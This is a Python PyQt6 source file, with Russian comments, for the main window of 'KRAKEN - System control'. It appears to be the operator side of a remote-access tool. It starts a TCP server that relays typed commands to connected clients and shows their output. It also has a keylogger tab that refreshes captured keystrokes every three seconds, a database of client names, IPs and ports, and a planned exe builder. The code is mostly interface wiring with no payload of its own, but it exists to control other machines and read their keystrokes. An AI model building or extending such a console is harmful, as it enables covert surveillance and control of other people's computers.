import sqlite3
import os
import sys
import asyncio
from PyQt6.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QPushButton, QTextEdit, QLabel, QScrollArea, QTableWidget, 
                             QTableWidgetItem, QLineEdit, QMessageBox, QMenu)
from PyQt6.QtCore import Qt, QTimer
from PyQt6.QtGui import QIcon
from qasync import asyncSlot
# import discordrp
import logging


#* Импорты моих модулей
# Админ терминал
from .adminTerminal_interface import TerminalWindow
# Большие тексты
from .utils import symbol, warning_message, bible, template_keyLog_text, support_text
# Файл со стилями
from .utils.style.style_variables_editable import editable_colors
# Изменения цвета
from .change_color_interface import ColorChangerApp
# Текст Кей логгера
from .utils.keyLog_text import keyLog_text



logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("kraken.log"),
        logging.StreamHandler()
    ]
)

def handle_exception(exc_type, exc_value, exc_traceback):
    """Обработчик необработанных исключений."""
    logging.error("Unhandled exception", exc_info=(exc_type, exc_value, exc_traceback))


# Перехват необработанных исключений
sys.excepthook = handle_exception


# Функция для получения пути уже в exe
def resource_path(relative_path):
  """ Получить абсолютный путь к ресурсу. """
  if hasattr(sys, '_MEIPASS'):
    # Если приложение собрано в один файл (--onefile)
    base_path = sys._MEIPASS
  else:
    # Если приложение запущено из исходного кода
    base_path = os.path.abspath(".")

  return os.path.join(base_path, relative_path)


#! Класс Основного окна
class MainWindow(QMainWindow):
  def __init__(self):
    super().__init__()
    #! Основные настройки
    # Настройка основного окна
    self.setWindowTitle("KRAKEN - System control")

    # Иконка приложения
    self.icon_path = resource_path("img/kraken.jpg")
    self.setWindowIcon(QIcon(self.icon_path))

    # x, y, width, height
    self.setGeometry(200, 100, 1200, 700)

    # Получаем путь к БД
    self.db_path = resource_path('app/sqlite.db')

    # Применяем стили
    self.setStyleSheet(f"""
      QWidget {{
        background-color: #{editable_colors["QWidget_bc"]};  /* Темно-серый фон */
        color: #{editable_colors["text_color"]};  /* Белый текст */
      }}
      QPushButton {{
        background-color: #{editable_colors["button_bc"]};  /* Серый фон кнопок */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        border: 1px solid #{editable_colors["border_color"]};  /* Голубая рамка */
        padding: 5px;
        border-radius: 3px;
      }}
      QPushButton:hover {{
        background-color: #{editable_colors["border_color"]};  /* Голубой фон при наведении */
        color: #{editable_colors["button_color_hover"]};  /* Темный текст */
      }}
      QLineEdit, QTextEdit {{
        background-color: #{editable_colors["input_area"]};  /* Темно-серый фон полей ввода */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        border: 1px solid #{editable_colors["border_color"]};  /* Голубая рамка */
        padding: 5px;
        border-radius: 3px;
      }}
      QTableWidget {{
        background-color: #{editable_colors["input_area"]};  /* Темно-серый фон таблицы */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        gridline-color: #{editable_colors["border_color"]};  /* Голубые линии сетки */
      }}
      QHeaderView::section {{
        background-color: #{editable_colors["button_bc"]};  /* Серый фон заголовков таблицы */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        padding: 5px;
        border: 1px solid #{editable_colors["border_color"]};  /* Голубая рамка */
      }}
      QScrollArea {{
        background-color: #{editable_colors["button_color_hover"]};  /* Темно-серый фон */
        border: none;
      }}
      QLabel {{
        color: #{editable_colors["text_color"]};  /* Белый текст */
      }}
    """)

    # Создаем контейнер для кнопок и основного окна
    self.main_widget = QWidget()
    self.setCentralWidget(self.main_widget)
    # Основной layout
    self.main_layout = QVBoxLayout(self.main_widget)

    # Создаем верхнюю панель с кнопками
    self.top_buttons_layout = QHBoxLayout()
    self.main_layout.addLayout(self.top_buttons_layout)

    # Создаем кнопки
    self.button1 = QPushButton("Terminal")
    self.button2 = QPushButton("Video")
    self.button3 = QPushButton("Key Logger")
    self.button4 = QPushButton("Info")
    self.button5 = QPushButton("Data Base")

    # Добавляем кнопки на верхнюю панель
    self.top_buttons_layout.addWidget(self.button1)
    self.top_buttons_layout.addWidget(self.button2)
    self.top_buttons_layout.addWidget(self.button3)
    self.top_buttons_layout.addWidget(self.button4)
    self.top_buttons_layout.addWidget(self.button5)

    # Создаем контейнер для основного окна
    self.main_content = QWidget()
    self.main_layout.addWidget(self.main_content)

    # Основной layout для контента
    self.content_layout = QVBoxLayout(self.main_content)

    # Подключаем кнопки к соответствующим функциям
    self.button1.clicked.connect(self.show_terminal)
    self.button2.clicked.connect(self.show_video)
    self.button3.clicked.connect(self.show_keylogger)
    self.button4.clicked.connect(self.show_info)
    self.button5.clicked.connect(self.show_database)

    # Инициализируем начальный интерфейс
    self.show_terminal()

    # Подключение к базе данных SQLite
    self.db_connection = sqlite3.connect(self.db_path)  # Укажите путь к вашей базе данных
    self.cursor = self.db_connection.cursor()

    # Создаем тестовую таблицу, если её нет
    self.create_connection_table()

    # Переменная для хранения состояния сервера
    self.server_running = False
    self.clientid = "1337766338621607997"

    # Устанавливаем что кейлоггер не активен(чтобы не загружать систему)
    self.keylogger_active = False


  #! Терминал
  @asyncSlot()
  async def show_terminal(self):
    """
    Отображает интерфейс терминала.
    """
    logging.info("Отображение интерфейса терминала")

    self.clear_content()

    # Создание поля ввода команд
    self.terminal_input = QLineEdit()
    self.terminal_input.setPlaceholderText('Введите команду для терминала, ОСОБЫЕ команды начинаются с "/"')
    logging.debug("Создано поле ввода команд")

    # Создание области вывода результатов
    self.terminal_output = QTextEdit()
    self.terminal_output.setReadOnly(True)
    logging.debug("Создана область вывода результатов")

    # Добавление элементов в макет
    self.content_layout.addWidget(self.terminal_input)
    self.content_layout.addWidget(self.terminal_output)
    logging.debug("Элементы добавлены в макет")

    # Подключение обработчика выполнения команд
    self.terminal_input.returnPressed.connect(self.execute_command)
    logging.debug("Подключен обработчик выполнения команд")

    # Вывод картинки и предупреждения в терминал, из файла (additional_text.py - это файл для доп текстов)
    self.terminal_output.append(symbol)
    self.terminal_output.append(warning_message)
    logging.info("Предупреждение отображено в терминале")

  # Функция подключения к client
  @asyncSlot()
  async def handle_client(self, reader, writer):
    logging.debug("сопряжение с клиентом прошло успешно")
    self.reader = reader
    self.writer = writer
    self.terminal_output.append(f'{self.writer.get_extra_info("peername")} подключился к серверу\n')
    try:
      while True:
        logging.debug("обрабатываем запросы клиента")
        self.data = await self.reader.read(4096)
        if not self.data:
          logging.info("данные пустые, клиент возможно отключился")
          self.terminal_output.append('Клиент отключился, rest and peace')
          break
        self.message = self.data.decode("utf-8").strip()
        logging.info(f"получено сообщение: {self.message}")
        self.terminal_output.append(self.message)
        print(f"{self.message}")
        await writer.drain()
    except Exception as e:
      self.terminal_output.append(f"если ты это видишь, видимо ты где-то облажался, rest and peace")
      self.terminal_output.insertHtml(f"<font color='red'>{e}</font><br>")
    finally:
      # Закрытие соединения
      logging.info(f'Закрытие соединения с клиентом {self.writer.get_extra_info("peername")}')
      writer.close()
      await writer.wait_closed()


  #! Обработка команд
  @asyncSlot()
  async def execute_command(self):
    """
    Обрабатывает ввод команды в терминале.
    """
    command = self.terminal_input.text()
    logging.info(f"Команда получена: {command}")

    # Очищаем поле ввода
    logging.debug("Очищаем поле ввода")
    self.terminal_input.clear()

    logging.debug("Добавляем команду в историю вывода")
    self.terminal_output.append(" ")
    self.terminal_output.append(f"\n<font color='lightBlue'>[username@kraken ~] $</font> {command}\n")

    # Обработка ОСОБЫХ команд
    if command == "/help":
      logging.info("Обработка команды /help")
      self.terminal_output.append('''
      /con_info                  Информация о подключении
      /connect                   Подключиться к клиенту
      /disconnect                Отключиться от клиента
      /terminal -A               Вызов админ панели
      /colorface                 Настройка цвета окна
      /bible                     ?
      /support                   Информация о 
      ''')

    # Узнать состояние подключения
    elif command == "/con_info":
      logging.info("Обработка команды /con_info")
      logging.debug("Проверяем статус подключения")
      logging.debug(f"Текущий статус подключения: {self.server_running}")
      if self.server_running:
        self.terminal_output.append("Статус подключения: <font color='green'>ПОДКЛЮЧЕН</font>")
      else:
        self.terminal_output.append("Статус подключения: <font color='red'>ОТКЛЮЧЕН</font>")

    # Библия сотворение земли - бытие глава первая
    elif command == "/bible":
      self.terminal_output.append(bible)
    
    # Подключиться к серверу
    elif command.startswith("/connect"):
      isvalid = True
      parts = command.split()
      if len(parts) == 3:
        logging.info("Обработка команды /connect")
        logging.debug("Проверяем статус подключения")
        logging.debug(f"Текущий статус подключения: {self.server_running}")
        if not self.server_running:
          self.server_running = True
          logging.debug("Запускаем сервер")
          try:
              self.server = await asyncio.start_server(self.handle_client, parts[1], parts[2])
          except Exception as e:
              isvalid = False
              logging.error(e)
              self.terminal_output.append(f"<font color='red'>{e}</font>")
          if isvalid:
            self.terminal_output.append(f"<font color='green'>Сервер запущен на {parts[1]}:{parts[2]}</font>\n")
        else:
          self.terminal_output.append("\n<font color='lightblue'>Сервер уже был запущен</font>\n")
      else:
        self.terminal_output.append("Ошибка: Неверный формат команды. Используйте /connect айпи порт")

    # Отключиться от сервера
    elif command == "/disconnect":
      logging.info("Обработка команды /disconnect")
      if self.server_running:
        self.server_running = False
        self.terminal_output.append("<font color='red'>Сервер остановлен</font>\n")
        logging.debug("Останавливаем сервер")
        self.server.close()
        await self.server.wait_closed()
      else:
        self.terminal_output.append("<font color='red'>Сервер не был запущен</font>\n")

    # Вызов админ терминала
    elif command == "/terminal -A":
      self.admin_terminal = TerminalWindow()
      self.admin_terminal.show()
    
    # Вызов окна изменения цвета программы
    elif command == "/colorface":
      self.color_interface = ColorChangerApp(parent=self)  # Передаем ссылку на родительское окно
      self.color_interface.show()

    elif command == "/support":
      self.terminal_output.append(support_text)



    # Обработка НЕ ОСОБЫХ команд
    else:
      logging.info("Обработка обычной команды")
      if self.server_running:
        logging.debug("Сервер подключен, передаем команду клиенту")
        try:
          self.writer.write(command.encode("utf-8"))
          logging.debug("Команда успешно отправлена клиенту")
        except AttributeError as e:
          logging.error(f"Ошибка при отправке команды: {e}")
          self.terminal_output.append(f"<font color='red'>Ошибка: {e}</font> - возможно клиент еще не подключен либо версия ПО у клиента и сервера отличаются\n")
      else:
        logging.warning("Сервер не подключен, команда не может быть обработана")
        self.terminal_output.append(f"<font color='red'>Команда {command} не обработана т.к. сервер не подключен</font>\n")





  #! Видео
  @asyncSlot()
  async def show_video(self):
    """
    Отображает интерфейс для видео.
    """
    logging.info("Отображение интерфейса для видео")
    self.clear_content()

    logging.debug("Создание метки для видео")
    self.video_label = QLabel("Здесь будет видео")
    self.video_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

    logging.debug("Добавление метки в макет")
    self.content_layout.addWidget(self.video_label)


  #! Key Logger
  @asyncSlot()
  async def show_keylogger(self):
    """
    Отображает интерфейс для Key Logger.
    """
    logging.info("Отображение интерфейса для Key Logger")
    self.clear_content()
    
    # Устанавливаем флаг, что Key Logger активен
    self.keylogger_active = True

    # Создаем текстовое поле
    self.text_edit = QTextEdit(self)
    self.text_edit.setReadOnly(True)  # Делаем поле только для чтения
    self.text_edit.setText(self.load_keylog_text())  # Устанавливаем текст из переменной
    self.content_layout.addWidget(self.text_edit)

    # Создаем кнопку "Обновить"
    self.update_button = QPushButton('Обновить', self)
    self.update_button.clicked.connect(self.update_text)
    self.content_layout.addWidget(self.update_button)

    # Создаем кнопку "Очистить"
    self.clear_button = QPushButton('Очистить', self)
    self.clear_button.clicked.connect(self.clear_text)
    self.content_layout.addWidget(self.clear_button)

    if self.keylogger_active:
      # Инициализация таймера для обновления текстового поля
      self.timer = QTimer()
      self.timer.timeout.connect(self.update_text)
      self.timer.start(3000)  # Обновление каждые 3 секунды

  # Загрузка текста из файла
  def load_keylog_text(self):
    """
    Загружает текст из файла keyLog_text.py.
    """
    try:
      # Получаем путь к файлу
      self.keyLog_text_path = resource_path("app/interfaces/utils/keyLog_text.py")
      with open(self.keyLog_text_path, "r", encoding="utf-8") as file:
        # Ищем строку с keyLog_text и извлекаем её значение
        for line in file:
          if line.startswith("keyLog_text ="):
            return line.split("=", 1)[1].strip().strip('"')
    except Exception as e:
      logging.error(f"Ошибка при загрузке keyLog_text: {e}")
    return ""

  @asyncSlot()
  async def update_text(self):
    """
    Обновляет текст в текстовом поле.
    """
    # Перезагружаем текст из файла если key logger активен
    if self.keylogger_active:
      updated_text = self.load_keylog_text()
      self.text_edit.setText(updated_text)
      logging.info("Текст Key Logger обновлен")

  def clear_text(self):
    """
    Очищает текст в переменной и в текстовом поле.
    """
    # Получаем путь к файлу
    self.keyLog_text_path = resource_path("app/interfaces/utils/keyLog_text.py")
    with open(self.keyLog_text_path, "w", encoding="utf-8") as file:
      file.write(template_keyLog_text)
    self.text_edit.setText("")  # Очищаем текстовое поле



  #! Сборка
  @asyncSlot()
  async def show_info(self):
    """
    Отображает интерфейс для информации.
    """
    logging.info("Отображение интерфейса для информации")
    self.clear_content()

    logging.debug("Создание метки для отображения информации")
    self.info_label = QLabel()
    self.info_label.setAlignment(Qt.AlignmentFlag.AlignLeft)

    info_text = f"""
    Здесь будет сборка exe(Скоро)
    """

    logging.debug("Установка текста для метки информации")
    self.info_label.setText(info_text)

    logging.debug("Добавление метки в макет")
    self.content_layout.addWidget(self.info_label)

  #! База данных
  def create_connection_table(self):
    """
    Создает тестовую таблицу в базе данных, если она не существует.
    """
    self.cursor.execute("""
      CREATE TABLE IF NOT EXISTS connection_table (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        ip TEXT,
        port TEXT
      )
    """)
    self.db_connection.commit()

# Отображение БД
  @asyncSlot()
  async def show_database(self):
    """
    Отображает интерфейс для базы данных.
    Заполняет таблицу данными из SQLite.
    """
    self.clear_content()

    # Создаем контейнер для полей ввода и кнопки добавления
    self.input_container = QWidget()
    self.input_layout = QHBoxLayout(self.input_container)

    # Создаем поля ввода для name, ip и port
    self.name_input = QLineEdit()
    self.name_input.setPlaceholderText("Name")
    self.ip_input = QLineEdit()
    self.ip_input.setPlaceholderText("IP")
    self.port_input = QLineEdit()
    self.port_input.setPlaceholderText("Port")

    # Создаем кнопку "Добавить"
    self.add_button = QPushButton("Добавить")
    self.add_button.clicked.connect(self.add_to_database)

    # Добавляем поля ввода и кнопку в layout
    self.input_layout.addWidget(self.name_input)
    self.input_layout.addWidget(self.ip_input)
    self.input_layout.addWidget(self.port_input)
    self.input_layout.addWidget(self.add_button)

    # Создаем прокручиваемую область и таблицу
    self.scroll_area = QScrollArea()
    self.scroll_area.setWidgetResizable(True)

    self.table_widget = QTableWidget()
    self.table_widget.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)  # Включаем контекстное меню
    self.table_widget.customContextMenuRequested.connect(self.show_context_menu)  # Подключаем обработчик
    self.scroll_area.setWidget(self.table_widget)

    # Добавляем контейнер с полями ввода и таблицу в layout
    self.content_layout.addWidget(self.input_container)
    self.content_layout.addWidget(self.scroll_area)

    # Обновляем таблицу данными из базы данных
    await self.update_table()

  #* Контекстное меню для таблицы
  def show_context_menu(self, position):
    """
    Показывает контекстное меню при клике правой кнопкой мыши на ячейку первого столбца.
    """
    # Получаем строку, на которую кликнули
    row = self.table_widget.rowAt(position.y())
    col = self.table_widget.columnAt(position.x())

    # Показываем меню только для первого столбца
    if col == 0 and row >= 0:
      # Создаем контекстное меню
      menu = QMenu(self.table_widget)

      #* НАШИ ДЕЙСТВИЯ
      # Добавляем действие "Сказать привет"
      say_hello_action = menu.addAction("Сказать привет")
      say_hello_action.triggered.connect(lambda: self.say_hello(row))

      # Добавляем действие "Удалить"
      delete_user_action = menu.addAction("Удалить пользователя")
      delete_user_action.triggered.connect(lambda: self.delete_user(row))




      # Показываем меню
      menu.exec(self.table_widget.viewport().mapToGlobal(position))

  # ФУНКЦИИ КОНТЕКСТНОГО МЕНЮ
  # ТЕСТ: Сказать привет
  def say_hello(self, row):
    """
    Выводит сообщение с приветствием для выбранной строки.
    """
    name = self.table_widget.item(row, 0).text()
    QMessageBox.information(self, "Привет", f"Привет, {name}!")

  # Удаление пользователя из БД
  def delete_user(self, row):
    row_number = row + 1
    try:
      if row_number < 1:
        QMessageBox.warning(self, "Ошибка", "Номер строки должен быть больше 0")
        return

      # Получаем список ID из базы данных
      self.cursor.execute("SELECT id FROM connection_table")
      ids = [row[0] for row in self.cursor.fetchall()]

      # Проверяем, что номер строки корректен
      if 1 <= row_number <= len(ids):
        # Удаляем строку из базы данных
        self.cursor.execute("DELETE FROM connection_table WHERE id = ?", (ids[row_number - 1],))
        self.db_connection.commit()
        self.update_table()  # Обновляем таблицу
      else:
        QMessageBox.warning(self, "Ошибка", "Номер строки вне диапазона")
    except ValueError:
      QMessageBox.warning(self, "Ошибка", "Ошибка: введите корректный номер строки")



  #* Добавление данных в базу данных
  @asyncSlot()
  async def add_to_database(self):
    """
    Добавляет данные из полей ввода в базу данных.
    """
    # Получаем данные из полей ввода
    name = self.name_input.text().strip()
    ip = self.ip_input.text().strip()
    port = self.port_input.text().strip()

    # Проверяем что ip введён правильно
    if not self.validate_ip(ip):
      QMessageBox.warning(self, "Ошибка", "Некорректный IP")
      return
    # Проверяем, что все поля заполнены
    if not name or not ip or not port:
      QMessageBox.warning(self, "Ошибка", "Все поля должны быть заполнены")
      return

    # Добавляем данные в базу данных
    self.cursor.execute("""
      INSERT INTO connection_table (name, ip, port)
      VALUES (?, ?, ?)
    """, (name, ip, port))
    self.db_connection.commit()

    # Очищаем поля ввода
    self.name_input.clear()
    self.ip_input.clear()
    self.port_input.clear()

    # Обновляем таблицу
    await self.update_table()

  #* Обновление таблицы
  @asyncSlot()
  async def update_table(self):
    """
    Обновляет таблицу данными из базы данных.
    """
    # Получаем данные из базы данных
    self.cursor.execute("SELECT name, ip, port FROM connection_table")
    data = self.cursor.fetchall()

    # Устанавливаем количество строк и столбцов в таблице
    self.table_widget.setRowCount(len(data))
    self.table_widget.setColumnCount(3)
    self.table_widget.setHorizontalHeaderLabels(["Name", "IP", "Port"])

    # Заполняем таблицу данными
    for row_index, row_data in enumerate(data):
      for col_index, col_data in enumerate(row_data):
        self.table_widget.setItem(row_index, col_index, QTableWidgetItem(str(col_data)))

  #* Закрытие базы данных
  def closeEvent(self, event):
    """
    Закрывает соединение с базой данных при закрытии приложения.
    """
    self.db_connection.close()
    event.accept()



  def validate_ip(self, ip):
    """
    Проверяет корректность IP-адреса.
    """
    parts = ip.split(".")
    if len(parts) != 4:
      return False
    for part in parts:
      try:
        num = int(part)
        if num < 0 or num > 255:
          return False
      except ValueError:
        return False
    return True

  # Функция обновления стилей
  def update_styles(self):
    self.setStyleSheet(f"""
      QWidget {{
        background-color: #{editable_colors["QWidget_bc"]};  /* Темно-серый фон */
        color: #{editable_colors["text_color"]};  /* Белый текст */
      }}
      QPushButton {{
        background-color: #{editable_colors["button_bc"]};  /* Серый фон кнопок */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        border: 1px solid #{editable_colors["border_color"]};  /* Голубая рамка */
        padding: 5px;
        border-radius: 3px;
      }}
      QPushButton:hover {{
        background-color: #{editable_colors["border_color"]};  /* Голубой фон при наведении */
        color: #{editable_colors["button_color_hover"]};  /* Темный текст */
      }}
      QLineEdit, QTextEdit {{
        background-color: #{editable_colors["input_area"]};  /* Темно-серый фон полей ввода */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        border: 1px solid #{editable_colors["border_color"]};  /* Голубая рамка */
        padding: 5px;
        border-radius: 3px;
      }}
      QTableWidget {{
        background-color: #{editable_colors["input_area"]};  /* Темно-серый фон таблицы */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        gridline-color: #{editable_colors["border_color"]};  /* Голубые линии сетки */
      }}
      QHeaderView::section {{
        background-color: #{editable_colors["button_bc"]};  /* Серый фон заголовков таблицы */
        color: #{editable_colors["text_color"]};  /* Белый текст */
        padding: 5px;
        border: 1px solid #{editable_colors["border_color"]};  /* Голубая рамка */
      }}
      QScrollArea {{
        background-color: #{editable_colors["button_color_hover"]};  /* Темно-серый фон */
        border: none;
      }}
      QLabel {{
        color: #{editable_colors["text_color"]};  /* Белый текст */
      }}
    """)

  #! Очистка интерфейса
  def clear_content(self):
    """
    Очищает содержимое основного окна, удаляя все виджеты из content_layout.
    """
    for i in reversed(range(self.content_layout.count())):
      self.content_layout.itemAt(i).widget().setParent(None)

    # Устанавливаем что кейлоггер не активен(чтобы не загружать систему)
    self.keylogger_active = False